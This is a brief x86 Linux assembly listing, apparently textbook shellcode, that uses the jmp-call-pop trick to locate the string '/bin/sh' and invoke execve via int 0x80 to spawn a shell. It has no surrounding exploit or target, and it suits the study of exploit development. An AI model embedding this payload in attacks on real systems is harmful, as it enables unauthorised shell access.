[section .data]

global _start

_start:
	jmp sh
se:
	pop ebx
	mov eax, 11
	mov ecx, 0
	mov edx, 0
	int 0x80
sh:
	call se
	db '/bin/sh', 0
